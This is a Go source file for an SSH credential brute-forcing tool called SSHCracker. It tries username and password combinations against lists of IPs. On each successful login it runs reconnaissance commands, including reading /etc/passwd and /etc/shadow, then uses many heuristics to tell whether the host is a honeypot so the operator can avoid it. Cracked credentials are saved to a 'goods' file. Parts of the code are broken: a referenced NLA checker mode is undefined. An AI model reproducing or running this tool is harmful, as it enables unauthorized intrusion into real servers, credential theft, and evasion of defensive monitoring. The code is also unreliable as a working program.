package main

import (
	"bufio"
	"fmt"
	"log"
	"math"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
var ipFile string
var timeout int
var maxConnections int

const VERSION = "2.6"

var (
	successfulIPs = make(map[string]struct{})
	mapMutex      sync.Mutex
)

// Enhanced task structure for better performance
type SSHTask struct {
	IP       string
	Port     string
	Username string
	Password string
}

// Worker pool configuration
const (
	CONCURRENT_PER_WORKER = 25  // Each worker handles 25 concurrent connections
)

// Server information structure
type ServerInfo struct {
	IP              string
	Port            string
	Username        string
	Password        string
	IsHoneypot      bool
	HoneypotScore   int
	SSHVersion      string
	OSInfo          string
	Hostname        string
	ResponseTime    time.Duration
	Commands        map[string]string
	OpenPorts       []string
}

// Honeypot detection structure
type HoneypotDetector struct {
	SuspiciousPatterns []string
	TimeAnalysis       bool
	CommandAnalysis    bool
	NetworkAnalysis    bool
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Select mode (1: SSHCracker, 2: NLA Checker): ")
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(mode)

	createComboFile(reader)
	fmt.Print("Enter the IP list file path: ")
	ipFile, _ = reader.ReadString('\n')
	ipFile = strings.TrimSpace(ipFile)

	fmt.Print("Enter the timeout value (seconds): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))

	fmt.Print("Enter the maximum number of workers: ")
	maxConnectionsStr, _ := reader.ReadString('\n')
	maxConnections, _ = strconv.Atoi(strings.TrimSpace(maxConnectionsStr))

	startTime = time.Now()

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	if mode == "1" {
		// Run SSHCracker
		setupEnhancedWorkerPool(combos, ips)
	} else if mode == "2" {
		// Run NLA Checker
		setupNLAWorkerPool(combos, ips)
	} else {
		log.Fatal("Invalid mode selected. Use 1 for SSHCracker or 2 for NLA Checker.")
	}

	banner()
	fmt.Println("Operation completed successfully!")
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(reader *bufio.Reader) {
	fmt.Print("Enter the username list file path: ")
	usernameFile, _ := reader.ReadString('\n')
	usernameFile = strings.TrimSpace(usernameFile)
	fmt.Print("Enter the password list file path: ")
	passwordFile, _ := reader.ReadString('\n')
	passwordFile = strings.TrimSpace(passwordFile)

	usernames := getItems(usernameFile)
	passwords := getItems(passwordFile)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

// Gather system information
func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	commands := map[string]string{
		"hostname":    "hostname",
		"uname":       "uname -a",
		"whoami":      "whoami",
		"pwd":         "pwd",
		"ls_root":     "ls -la /",
		"ps":          "ps aux | head -10",
		"netstat":     "netstat -tulpn | head -10",
		"history":     "history | tail -5",
		"ssh_version": "ssh -V",
		"uptime":      "uptime",
		"mount":       "mount | head -5",
		"env":         "env | head -10",
	}

	for cmdName, cmd := range commands {
		output := executeCommand(client, cmd)
		serverInfo.Commands[cmdName] = output
		
		// Extract specific information
		switch cmdName {
		case "hostname":
			serverInfo.Hostname = strings.TrimSpace(output)
		case "uname":
			serverInfo.OSInfo = strings.TrimSpace(output)
		case "ssh_version":
			serverInfo.SSHVersion = strings.TrimSpace(output)
		}
	}
	
	// Scan local ports
	serverInfo.OpenPorts = scanLocalPorts(client)
}

// Execute command on server
func executeCommand(client *ssh.Client, command string) string {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	defer session.Close()

	output, err := session.CombinedOutput(command)
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	
	return string(output)
}

// Scan local ports
func scanLocalPorts(client *ssh.Client) []string {
	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
	var ports []string
	
	lines := strings.Split(output, "\n")
	portRegex := regexp.MustCompile(`:(\d+)\s`)
	
	for _, line := range lines {
		matches := portRegex.FindAllStringSubmatch(line, -1)
		for _, match := range matches {
			if len(match) > 1 {
				port := match[1]
				if !contains(ports, port) {
					ports = append(ports, port)
				}
			}
		}
	}
	
	return ports
}

// Helper function to check existence in slice
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// Advanced honeypot detection algorithm (BETA)
func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
	honeypotScore := 0
	
	// 1. Analyze suspicious patterns in command output
	honeypotScore += analyzeCommandOutput(serverInfo)
	
	// 2. Analyze response time
	if detector.TimeAnalysis {
		honeypotScore += analyzeResponseTime(serverInfo)
	}
	
	// 3. Analyze file and directory structure
	honeypotScore += analyzeFileSystem(serverInfo)
	
	// 4. Analyze running processes
	honeypotScore += analyzeProcesses(serverInfo)
	
	// 5. Analyze network and ports
	if detector.NetworkAnalysis {
		honeypotScore += analyzeNetwork(client)
	}
	
	// 6. Behavioral tests
	honeypotScore += behavioralTests(client, serverInfo)
	
	// 7. Detect abnormal patterns
	honeypotScore += detectAnomalies(serverInfo)
	
	// 8. Advanced tests
	honeypotScore += advancedHoneypotTests(client)
	
	// 9. Performance tests
	honeypotScore += performanceTests(client)
	
	// Record score
	serverInfo.HoneypotScore = honeypotScore
	
	// Honeypot detection threshold: score 6 or higher
	// This threshold provides good balance between false positives and false negatives
	// - Score 1-3: Low probability (legitimate servers with some restrictions)
	// - Score 4-5: Medium probability (possibly limited environments)
	// - Score 6+: High probability (likely honeypot)
	return honeypotScore >= 6
}

// Analyze command output for suspicious patterns
func analyzeCommandOutput(serverInfo *ServerInfo) int {
	score := 0
	
	for _, output := range serverInfo.Commands {
		lowerOutput := strings.ToLower(output)
		
		// Check specific honeypot patterns
		honeypotIndicators := []string{
			"fake", "simulation", "honeypot", "trap", "monitor",
			"cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
			"/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
		}
		
		for _, indicator := range honeypotIndicators {
			if strings.Contains(lowerOutput, indicator) {
				score += 3
			}
		}
	}
	
	return score
}

// Analyze response time
func analyzeResponseTime(serverInfo *ServerInfo) int {
	responseTime := serverInfo.ResponseTime.Milliseconds()
	
	// Very fast response time (less than 10 milliseconds) is suspicious
	if responseTime < 10 {
		return 2
	}
	
	return 0
}

// Analyze file system structure
func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	
	lsOutput, exists := serverInfo.Commands["ls_root"]
	if !exists {
		return 0
	}
	
	// Check abnormal structure
	suspiciousPatterns := []string{
		"total 0",           // Empty directory is suspicious
		"total 4",           // Low file count
		"honeypot",          // Explicit name
		"fake",              // Fake files
		"simulation",        // Simulation
	}
	
	lowerOutput := strings.ToLower(lsOutput)
	for _, pattern := range suspiciousPatterns {
		if strings.Contains(lowerOutput, pattern) {
			score++
		}
	}
	
	// Low file count in root
	lines := strings.Split(strings.TrimSpace(lsOutput), "\n")
	if len(lines) < 5 { // Less than 5 files/directories in root
		score++
	}
	
	return score
}

// Analyze running processes
func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	
	psOutput, exists := serverInfo.Commands["ps"]
	if !exists {
		return 0
	}
	
	// Suspicious processes
	suspiciousProcesses := []string{
		"cowrie", "kippo", "honeypot", "honeyd",
		"artillery", "honeytrap", "glastopf",
		"python honeypot", "perl honeypot",
	}
	
	lowerOutput := strings.ToLower(psOutput)
	for _, process := range suspiciousProcesses {
		if strings.Contains(lowerOutput, process) {
			score += 2
		}
	}
	
	// Low process count
	lines := strings.Split(strings.TrimSpace(psOutput), "\n")
	if len(lines) < 5 {
		score++
	}
	
	return score
}

// Analyze network configuration
func analyzeNetwork(client *ssh.Client) int {
	score := 0
	
	// 1. Check network configuration files
	networkConfigCheck := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5")
	if strings.Contains(strings.ToLower(networkConfigCheck), "total 0") || 
	   strings.Contains(strings.ToLower(networkConfigCheck), "no such file") ||
	   len(strings.TrimSpace(networkConfigCheck)) < 10 {
		// Missing network configuration files or empty output is suspicious
		score += 1
	}
	
	// 2. Check for fake network interfaces
	interfaceCheck := executeCommand(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5")
	if strings.Contains(strings.ToLower(interfaceCheck), "fake") ||
	   strings.Contains(strings.ToLower(interfaceCheck), "honeypot") ||
	   strings.Contains(strings.ToLower(interfaceCheck), "trap") ||
	   len(strings.TrimSpace(interfaceCheck)) < 10 {
		score += 1
	}
	
	// 3. Check routing table for suspicious patterns
	routeCheck := executeCommand(client, "ip route show 2>/dev/null | head -3")
	if len(strings.TrimSpace(routeCheck)) < 20 {
		// Very simple or empty routing table is suspicious
		score += 1
	}
	
	return score
}

// Behavioral tests
func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
	score := 0
	
	// Test 1: Create temporary file
	tempFileName := fmt.Sprintf("/tmp/test_%d", time.Now().Unix())
	createCmd := fmt.Sprintf("echo 'test' > %s", tempFileName)
	createOutput := executeCommand(client, createCmd)
	
	// If unable to create file, it's suspicious
	if strings.Contains(strings.ToLower(createOutput), "error") ||
	   strings.Contains(strings.ToLower(createOutput), "permission denied") {
		score++
	} else {
		// Delete test file
		executeCommand(client, fmt.Sprintf("rm -f %s", tempFileName))
	}
	
	// Test 2: Access to sensitive files
	sensitiveFiles := []string{"/etc/passwd", "/etc/shadow", "/proc/version"}
	accessibleCount := 0
	
	for _, file := range sensitiveFiles {
		output := executeCommand(client, fmt.Sprintf("cat %s 2>/dev/null | head -1", file))
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
			accessibleCount++
		}
	}
	
	// If all files are accessible, it's suspicious
	if accessibleCount == len(sensitiveFiles) {
		score++
	}
	
	// Test 3: Test system commands
	systemCommands := []string{"id", "whoami", "pwd"}
	workingCommands := 0
	
	for _, cmd := range systemCommands {
		output := executeCommand(client, cmd)
		if !strings.Contains(strings.ToLower(output), "error") && len(output) > 0 {
			workingCommands++
		}
	}
	
	// If no commands work, it's suspicious
	if workingCommands == 0 {
		score += 2
	}
	
	return score
}

// Advanced honeypot detection tests
func advancedHoneypotTests(client *ssh.Client) int {
	score := 0
	
	// Test 1: Check CPU and Memory
	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name' | head -1")
	
	if strings.Contains(strings.ToLower(cpuInfo), "qemu") ||
	   strings.Contains(strings.ToLower(cpuInfo), "virtual") {
		score++ // May be a virtual machine
	}
	
	// Test 2: Check kernel and distribution
	kernelInfo := executeCommand(client, "uname -r")
	
	// Very new or old kernels are suspicious
	if strings.Contains(kernelInfo, "generic") && len(strings.TrimSpace(kernelInfo)) < 20 {
		score++
	}
	
	// Test 3: Check package management
	packageManagers := []string{
		"which apt", "which yum", "which pacman", "which zypper",
	}
	
	workingPMs := 0
	for _, pm := range packageManagers {
		output := executeCommand(client, pm)
		if !strings.Contains(output, "not found") && len(strings.TrimSpace(output)) > 0 {
			workingPMs++
		}
	}
	
	// If no package manager exists, it's suspicious
	if workingPMs == 0 {
		score++
	}
	
	// Test 4: Check system services
	services := executeCommand(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10")
	if strings.Contains(services, "0 loaded units") || len(strings.TrimSpace(services)) < 50 {
		score++
	}
	
	// Test 5: Check internet access
	internetTest := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
	if len(strings.TrimSpace(internetTest)) == 0 {
		// May not have internet access (suspicious for honeypot)
		score++
	}
	
	return score
}

// Performance and system behavior tests
func performanceTests(client *ssh.Client) int {
	score := 0
	
	// I/O speed test
	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
	if strings.Contains(ioTest, "command not found") {
		// Time analysis - if command not found it's suspicious
		score++
	}
	
	// Clean up test file
	executeCommand(client, "rm -f /tmp/test")
	
	// Internal network test
	networkTest := executeCommand(client, "ss -tuln 2>/dev/null | wc -l")
	if networkTest != "" {
		if count, err := strconv.Atoi(strings.TrimSpace(networkTest)); err == nil {
			if count < 5 { // Low network connection count
				score++
			}
		}
	}
	
	return score
}

// Detect abnormal patterns
func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	
	// Check hostname
	if hostname := serverInfo.Hostname; hostname != "" {
		suspiciousHostnames := []string{
			"honeypot", "fake", "trap", "monitor", "sandbox",
			"test", "simulation", "GNU/Linux", "PREEMPT_DYNAMIC", // Very generic names
		}
		
		lowerHostname := strings.ToLower(hostname)
		for _, suspicious := range suspiciousHostnames {
			if strings.Contains(lowerHostname, suspicious) {
				score++
			}
		}
	}
	
	// Check uptime
	uptimeOutput, exists := serverInfo.Commands["uptime"]
	if exists {
		// If uptime is very low (less than 1 hour) or command not found, it's suspicious
		if strings.Contains(uptimeOutput, "0:") || 
		   strings.Contains(uptimeOutput, "min") || 
		   strings.Contains(uptimeOutput, "command not found") {
			score++
		}
	}
	
	// Check command history
	historyOutput, exists := serverInfo.Commands["history"]
	if exists {
		lines := strings.Split(strings.TrimSpace(historyOutput), "\n")
		// Very little or empty history
		if len(lines) < 3 {
			score++
		}
	}
	
	return score
}

// Log successful connection
func logSuccessfulConnection(serverInfo *ServerInfo) {
	successMessage := fmt.Sprintf("%s:%s@%s:%s", 
		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
	
	// Save to main file
	appendToFile(successMessage+"\n", "su-goods.txt")
	
	// Save detailed information to separate file
	detailedInfo := fmt.Sprintf(`
=== 🎯 SSH Success 🎯 ===
🌐 Target: %s:%s
🔑 Credentials: %s:%s
🖥️ Hostname: %s
🐧 OS: %s
📡 SSH Version: %s
⚡ Response Time: %v
🔌 Open Ports: %v
🍯 Honeypot Score: %d
🕒 Timestamp: %s
========================
`, 
		serverInfo.IP, serverInfo.Port,
		serverInfo.Username, serverInfo.Password,
		serverInfo.Hostname,
		serverInfo.OSInfo,
		serverInfo.SSHVersion,
		serverInfo.ResponseTime,
		serverInfo.OpenPorts,
		serverInfo.HoneypotScore,
		time.Now().Format("2006-01-02 15:04:05"),
	)
	
	appendToFile(detailedInfo, "detailed-results.txt")
	
	// Display success message in console
	fmt.Printf("✅ SUCCESS: %s\n", successMessage)
}

func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		totalConnections := int64(0)
		var goods, errors, honeypots, nlaEnabled int64
		var mode string

		if mode == "1" { // SSHCracker mode
			goods = atomic.LoadInt64(&stats.goods)
			errors = atomic.LoadInt64(&stats.errors)
			honeypots = atomic.LoadInt64(&stats.honeypots)
			totalConnections = goods + errors + honeypots
			mode = "SSHCracker"
		} else if mode == "2" { // NLA Checker mode
			goods = atomic.LoadInt64(&nlaStats.successes)
			errors = atomic.LoadInt64(&nlaStats.errors)
			nlaEnabled = atomic.LoadInt64(&nlaStats.nlaEnabled)
			totalConnections = goods + errors + nlaEnabled
			mode = "NLA Checker"
		}

		elapsedTime := time.Since(startTime).Seconds()
		connectionsPerSecond := float64(totalConnections) / elapsedTime
		estimatedRemainingTime := float64(totalIPCount-totalConnections) / connectionsPerSecond

		clear()

		fmt.Printf("================================================\n")
		fmt.Printf("🚀 Advanced %s v%s 🚀\n", mode, VERSION)
		fmt.Printf("================================================\n")
		fmt.Printf("📁 File: %s | ⏱️  Timeout: %ds\n", ipFile, timeout)
		fmt.Printf("🔗 Max Workers: %d | 🎯 Per Worker: %d\n", maxConnections, CONCURRENT_PER_WORKER)
		fmt.Printf("================================================\n")
		fmt.Printf("🔍 Checked: %d/%d\n", totalConnections, totalIPCount)
		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)

		if totalConnections < totalIPCount {
			fmt.Printf("⏳ Elapsed: %s\n", formatTime(elapsedTime))
			fmt.Printf("⏰ Remaining: %s\n", formatTime(estimatedRemainingTime))
		} else {
			fmt.Printf("⏳ Total Time: %s\n", formatTime(elapsedTime))
			fmt.Printf("✅ Scan Completed Successfully!\n")
		}

		fmt.Printf("================================================\n")
		if mode == "1" {
			fmt.Printf("✅ Successful SSH: %d\n", goods)
			fmt.Printf("❌ Failed: %d\n", errors)
			fmt.Printf("🍯 Honeypots: %d\n", honeypots)
			if totalConnections > 0 {
				successfulConnections := goods + honeypots
				if successfulConnections > 0 {
					fmt.Printf("📊 Success Rate: %.2f%%\n", float64(goods)/float64(successfulConnections)*100)
					fmt.Printf("🍯 Honeypot Rate: %.2f%%\n", float64(honeypots)/float64(successfulConnections)*100)
				}
			}
		} else if mode == "2" {
			fmt.Printf("✅ Non-NLA Connections: %d\n", goods)
			fmt.Printf("🔒 NLA-Enabled: %d\n", nlaEnabled)
			fmt.Printf("❌ Failed: %d\n", errors)
			if totalConnections > 0 {
				successfulConnections := goods + nlaEnabled
				if successfulConnections > 0 {
					fmt.Printf("📊 Non-NLA Rate: %.2f%%\n", float64(goods)/float64(successfulConnections)*100)
					fmt.Printf("🔒 NLA-Enabled Rate: %.2f%%\n", float64(nlaEnabled)/float64(successfulConnections)*100)
				}
			}
		}

		fmt.Printf("================================================\n")
		fmt.Printf("| 💻 Coded By SudoLite with ❤️  |\n")
		fmt.Printf("| 🔥 Enhanced Multi-Layer Workers v%s 🔥 |\n", VERSION)
		fmt.Printf("| 🛡️  No License Required 🛡️   |\n")
		fmt.Printf("================================================\n")

		if totalConnections >= totalIPCount {
			os.Exit(0)
		}
	}
}

func formatTime(seconds float64) string {
	days := int(seconds) / 86400
	hours := (int(seconds) % 86400) / 3600
	minutes := (int(seconds) % 3600) / 60
	seconds = math.Mod(seconds, 60)
	return fmt.Sprintf("%02d:%02d:%02d:%02d", days, hours, minutes, int(seconds))
}

func appendToFile(data, filepath string) {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open file for append: %s", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		log.Printf("Failed to write to file: %s", err)
	}
}

// Calculate optimal buffer sizes based on worker capacity
func calculateOptimalBuffers() int {
	// Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (Safety factor)
	taskBuffer := int(float64(maxConnections * CONCURRENT_PER_WORKER) * 1.5)
	
	return taskBuffer
}

// Enhanced worker pool system
func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
	// Calculate optimal buffer sizes using enhanced algorithm
	taskBufferSize := calculateOptimalBuffers()
	
	// Create channels with calculated buffer sizes
	taskQueue := make(chan SSHTask, taskBufferSize)
	
	var wg sync.WaitGroup
	
	// Start main workers
	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go enhancedMainWorker(i, taskQueue, &wg)
	}
	
	// Start progress banner
	go banner()
	
	// Generate and send tasks
	go func() {
		for _, combo := range combos {
			for _, ip := range ips {
				task := SSHTask{
					IP:       ip[0],
					Port:     ip[1],
					Username: combo[0],
					Password: combo[1],
				}
				taskQueue <- task
			}
		}
		close(taskQueue)
	}()
	
	// Wait for all workers to complete
	wg.Wait()
}

// Enhanced main worker with concurrent processing per worker
func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	
	// Semaphore to limit concurrent connections per worker
	semaphore := make(chan struct{}, CONCURRENT_PER_WORKER)
	var workerWg sync.WaitGroup
	
	for task := range taskQueue {
		workerWg.Add(1)
		semaphore <- struct{}{} // Acquire semaphore
		
		go func(t SSHTask) {
			defer workerWg.Done()
			defer func() { <-semaphore }() // Release semaphore
			
			processSSHTask(t)
		}(task)
	}
	
	workerWg.Wait() // Wait for all concurrent tasks to complete
}

// Process individual SSH task
func processSSHTask(task SSHTask) {
	// SSH connection configuration (same as original)
	config := &ssh.ClientConfig{
		User: task.Username,
		Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: time.Duration(timeout) * time.Second,
	}
	
	connectionStartTime := time.Now()
	
	// Test connection (same error handling as original)
	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
	if err == nil {
		defer client.Close()
		
		// Create server information
		serverInfo := &ServerInfo{
			IP:           task.IP,
			Port:         task.Port,
			Username:     task.Username,
			Password:     task.Password,
			ResponseTime: time.Since(connectionStartTime),
			Commands:     make(map[string]string),
		}
		
		// Honeypot detector
		detector := &HoneypotDetector{
			TimeAnalysis:    true,
			CommandAnalysis: true,
			NetworkAnalysis: true,
		}
		
		// Gather system information first
		gatherSystemInfo(client, serverInfo)
		
		// Run full honeypot detection (all 9 algorithms) with valid client
		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
		
		// Record result (same logic as original)
		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
		mapMutex.Lock()
		defer mapMutex.Unlock()
		if _, exists := successfulIPs[successKey]; !exists {
			successfulIPs[successKey] = struct{}{}
			if !serverInfo.IsHoneypot {
				atomic.AddInt64(&stats.goods, 1)
				logSuccessfulConnection(serverInfo)
			} else {
				atomic.AddInt64(&stats.honeypots, 1)
				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
			}
		}
	} else {
		// Same error handling as original
		atomic.AddInt64(&stats.errors, 1)
	}
}